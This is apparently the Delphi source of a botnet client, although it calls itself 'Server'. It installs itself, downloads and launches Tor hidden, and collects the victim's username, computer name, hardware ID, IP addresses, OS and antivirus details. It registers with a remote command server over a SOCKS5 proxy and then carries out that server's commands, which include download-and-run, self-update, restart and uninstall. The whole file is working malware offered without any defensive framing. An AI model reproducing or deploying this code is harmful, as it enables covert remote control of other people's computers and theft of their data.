program Server;

//{$APPTYPE CONSOLE}

{$R *.res}

uses
  windows,
  shellapi,
  System.SysUtils,
  UConfig in 'UConfig.pas',
  IdSocketHandle,
  IdServerIOHandler,
  IdServerIOHandlerSocket,
  IdSSLOpenSSL,
  idSocks,
  IdCustomTransparentProxy,
  IdConnectThroughHttpProxy,
  IdIOHandler,
  IdIOHandlerSocket,
  IdIOHandlerStack,
  IdBaseComponent,
  IdComponent,
  IdTCPConnection,
  IdTCPClient,
  IdStack,
  USysInfo in 'USysInfo.pas',
  UGetAv in 'UGetAv.pas',
  untInstallation in 'untInstallation.pas',
  untRegistry in 'untRegistry.pas',
  untUtils in 'untUtils.pas';

type
  TDynStringArray = array of string;

type
  TServer = class(TObject)
  Private

  Public
    procedure Connect;
    function UserName(): string;
    function CompName(): string;
    function Explode(const Separator, S :String; Limit :Integer = 0): TDynStringArray;
    Procedure ReceiveData(str:string);
end;

var
  Closed:    Boolean;
  Holder:    Boolean;
  tid :cardinal;
  var
  TCPClient: TIdTCPClient;

procedure TServer.ReceiveData(str: string);
var
  Data: String;
  strArr: TDynStringArray;
  Path:string;
begin

  //Convert our data to a string and trim it
  Data := STR;

  if Length(Data) > 0 then begin
 //  Writeln(data);
  //Setup our dynamic array structure
  StrArr := Explode('|', Data);


  if StrArr[0] = 'DownloadNRun' then
  begin
    DownloadFile(StrArr[1],StrArr[2],localAppDataPath);
  end;

  if StrArr[0] = 'Supdate' then
  begin
    DownloadFile(StrArr[1],'File.exe',localAppDataPath);
  end;

  if StrArr[0] = 'CloseSock' then
  begin
    closed := true;
    Holder := false;
    TCPClient.Disconnect;
    TerminateThread(Tid,0);
    sleep(100);
    ExitProcess(0);
  end;

  if StrArr[0] = 'Restart' then
  begin
    closed := true;
    Holder := false;
    TCPClient.Disconnect;
    TerminateThread(Tid,0);
    closed := false;
    Holder := true;
   // sleep(6000);
   // CreateThread(nil, 0,@TServer.Connect, nil, 0, tid);
  end;

  if StrArr[0] = 'Uninstall' then
  begin
    uninstall;
  end;

end;
end;

procedure SocketErrorHandler;
begin
   //messagebox(0,'','Error Restarting',0);
    closed := true;
    Holder := false;
    TCPClient.Disconnect;
    TerminateThread(Tid,0);
    sleep(30);
    closed := false;
    Holder := true;
    sleep(_iConneTimer_ * 60 * 1000);
    CreateThread(nil, 0,@TServer.Connect, nil, 0, tid);
end;

function IsPortActive(AHost : string; APort : Word): boolean;
var
  IdTCPClient : TIdTCPClient;
begin
  Result := False;
  try
    IdTCPClient := TIdTCPClient.Create(nil);
    try
      IdTCPClient.Host := AHost;
      IdTCPClient.Port := APort;
      IdTCPClient.Connect;
      Result := True;
    finally
      IdTCPClient.Free;
    end;
  except
    //Ignore exceptions
  end;
end;

Procedure TServer.Connect;
var
//TCPClient: TIdTCPClient;
SocksProxy: TIdSocksInfo;
IdIOHandlerStack:TIdIOHandlerStack;
Tmp:string;
iRecv: Integer;
begin
  try
  Closed := False;
  TCPClient := TIdTcpClient.create(nil);
  TCPClient.Host := Rhost;
  TCPClient.Port := RPort;
  IdIOHandlerStack:= TIdIOHandlerStack.Create (nil);
  SocksProxy := TIdSocksInfo.Create (nil);
  SocksProxy.Version := svSocks5;
  SocksProxy.Host := RPHost;
  SocksProxy.Port := RPPort;
  IdIOHandlerStack.TransparentProxy:= SocksProxy;
  IdIOHandlerStack.TransparentProxy.Enabled:= True;
  TCPCLient.IOHandler:= IdIOHandlerStack;
  if IsPortActive(RPHost,RPPort) then
  begin
    repeat
      try
      TCPClient.Connect;
//      if TCPClient.socket.connected then writeln('Connecting to '+Rhost + ' On Port : ' + inttostr(Rport));
            While TcpClient.Socket.Connected and Closed = false do   //tidiohandler
            begin
                if closed = true then TCPClient.Disconnect;
              //  Writeln('Connected To '+Rhost);
                TCPClient.Socket.WriteLn(Pchar('ADDNEW|'+ BotPassword +'|' + getHWID + '|' + GroupStr + '|' + Ip + '|' + LocalIP + '|' + UserName+'/'+ CompName + '|' + GetOs+Osbytes + '|' + Version +'|' + Av + '/' + FW));
                iRecv := TcpClient.Socket.RecvBufferSize;
                while TcpClient.socket.Connected and Closed = false and (iRecv > 0) do
                  begin
                    tmp := TCPClient.socket.ReadLn;
                    //writeln(tmp);
                    ReceiveData(tmp);
                    Tmp := '';
                  end;
                end;
                TCPClient.Disconnect;
                sleep(_iConneTimer_ * 60 * 1000);
          except
           SocketErrorHandler;
           Exit;
           //Holder := False;
          end;


    until(Holder = false);
  end;
  if IsPortActive(RPHost,RPPort) = false then
  begin
   GetTor;
  end;
  except
     SocketErrorHandler;
     Exit;
  end;
end;

function TServer.UserName(): string;
var
  User : array[0..255] of Char;
  SizeOfUser : Cardinal;
begin
  SizeOfUser := SizeOf(User);
  if GetUserName(User, SizeOfUser) = True then
    Result := string(User)
  else
  Result := 'Unknown';
end;

function TServer.CompName(): string;
var
  Comp : array[0..255] of Char;
  SizeOfComp : Cardinal;
begin
  SizeOfComp := SizeOf(Comp);
  if GetComputerName(Comp, SizeOfComp) = True then
    Result := string(Comp)
  else
  Result := 'Unknown'
end;

//This function splits up a given string into an array
function TServer.Explode(const Separator, S :String; Limit :Integer = 0): TDynStringArray;
  var
    SepLen: Integer;
    F, P: PChar;
begin
  SetLength(Result, 0);
  if (S = '') or (Limit < 0) then
    Exit;
  if Separator = '' then
    begin
      SetLength(Result, 1);
      Result[0] := S;
      Exit;
    end;
  SepLen := Length(Separator);

  P := PChar(S);
  while P^ <> #0 do
    begin
      F := P;
      P := AnsiStrPos(P, PChar(Separator));
      if (P = nil) or ((Limit > 0) and (Length(Result) = Limit - 1)) then
        P := StrEnd(F);
      SetLength(Result, Length(Result) + 1);
      SetString(Result[High(Result)], F, P - F);
      F := P;
      if P = Separator then
        SetLength(Result, Length(Result) + 1);
      while (P^ <> #0) and (P - F < SepLen) do
        Inc(P);
    end;
end;

procedure GetOsBytes();
begin
   if IsWow64 = true then
    begin
     Osbytes := '-64_Bit';
    end
    else
    begin
     Osbytes := '-32_Bit';
    end;
end;


begin
  Install;
  if not FileExists(LocalAppDataPath+_TorName_) then
        begin
            GetTor;
        end;
  Sleep(2000);
  StartPrxyHidden(LocalAppDataPath+_TorName_);
  IP:= GetExternalIP;
  GetOsBytes;
  GetAV;
  Holder := true;
  CreateThread(nil, 0,@TServer.Connect, nil, 0, tid);
  sleep(infinite);
end.
